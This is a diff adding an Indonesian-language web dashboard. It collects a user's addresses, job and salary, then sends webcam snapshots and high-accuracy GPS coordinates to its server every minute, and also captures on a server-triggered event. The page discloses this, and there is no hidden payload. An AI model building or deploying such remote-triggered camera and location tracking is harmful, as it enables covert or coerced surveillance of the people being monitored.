@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard User V.0.1.1</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { padding: 20px; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 12px; width: 100%; max-width: 450px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        h2 { text-align: center; margin-top: 0; }
+        .status { padding: 10px; background: #e0f7fa; color: #006064; border-radius: 6px; font-weight: bold; margin-top: 10px; text-align: center; }
+        .btn-action { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .btn-submit { background: #007bff; color: white; }
+        .btn-logout { background: #dc3545; color: white; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; font-weight: bold; }
+        input, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="form-container" style="display: none;">
+        <h2>Lengkapi Data Diri</h2>
+        <form onsubmit="submitFirstTimeForm(event)">
+            <div class="form-group"><label>Nama Lengkap</label><input type="text" id="prof-name" disabled style="background:#eee;"></div>
+            <div class="form-group"><label>Tempat Lahir</label><input type="text" id="prof-birthplace" required></div>
+            <div class="form-group"><label>Alamat KTP</label><textarea id="prof-fulladdress" required></textarea></div>
+            <div class="form-group"><label>Alamat Domisili</label><textarea id="prof-currentaddress" required></textarea></div>
+            <div class="form-group"><label>Pekerjaan Terakhir</label><input type="text" id="prof-lastjob" required></div>
+            <div class="form-group"><label>Gaji Terakhir (Rp)</label><input type="number" id="prof-lastsalary" required></div>
+            <button type="submit" class="btn-action btn-submit">Simpan & Mulai</button>
+        </form>
+    </div>
+
+    <div class="card" id="tracking-container" style="display: none; text-align: center;">
+        <h2 id="welcome-msg"></h2>
+        <div class="status" id="status-text">Menghubungkan akses...</div>
+        <p style="font-size: 13px; color: #666; margin-top: 15px;">Koordinat GPS dan snapshot kamera dikirim otomatis per menit.</p>
+        <button class="btn-action btn-logout" onclick="logout()">Logout</button>
+    </div>
+
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const userName = localStorage.getItem('userName');
+        const userEmail = localStorage.getItem('userEmail');
+        let isProfileComplete = localStorage.getItem('isProfileComplete') === 'true';
+
+        if (!userName || !userEmail) window.location.href = '/index.html';
+
+        if (!isProfileComplete) {
+            document.getElementById('form-container').style.display = 'block';
+            document.getElementById('prof-name').value = userName;
+        } else {
+            document.getElementById('tracking-container').style.display = 'block';
+            initTrackingApp();
+        }
+
+        async function submitFirstTimeForm(e) {
+            e.preventDefault();
+            const btn = e.target.querySelector('button'); btn.innerText = "Menyimpan..."; btn.disabled = true;
+
+            const body = {
+                email: userEmail, birthPlace: document.getElementById('prof-birthplace').value,
+                fullAddress: document.getElementById('prof-fulladdress').value, currentAddress: document.getElementById('prof-currentaddress').value,
+                lastJob: document.getElementById('prof-lastjob').value, lastSalary: document.getElementById('prof-lastsalary').value
+            };
+
+            const res = await fetch('/api/complete-profile', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+            const data = await res.json();
+
+            if (data.success) {
+                localStorage.setItem('isProfileComplete', 'true');
+                document.getElementById('form-container').style.display = 'none';
+                document.getElementById('tracking-container').style.display = 'block';
+                initTrackingApp();
+            } else { alert(data.message); btn.innerText = "Simpan & Mulai"; btn.disabled = false; }
+        }
+
+        function initTrackingApp() {
+            document.getElementById('welcome-msg').innerText = `Halo, ${userName}`;
+            const socket = io(); const video = document.getElementById('video'); const canvas = document.getElementById('canvas'); const context = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    document.getElementById('status-text').innerText = "Status: Pelacakan Aktif";
+                    socket.emit('join', { role: 'user', name: userName });
+                    captureAndSendData(); setInterval(captureAndSendData, 60000);
+                })
+                .catch(() => document.getElementById('status-text').innerText = "Kamera Gagal!");
+
+            socket.on('trigger_snapshot', captureAndSendData);
+
+            function captureAndSendData() {
+                context.drawImage(video, 0, 0, 320, 240);
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        socket.emit('send_data', { userName: userName, latitude: position.coords.latitude, longitude: position.coords.longitude, image: imageData });
+                    }, () => {}, { enableHighAccuracy: true });
+                }
+            }
+        }
+
+        function logout() { localStorage.clear(); window.location.href = '/index.html'; }
+    </script>
+</body>
+</html>
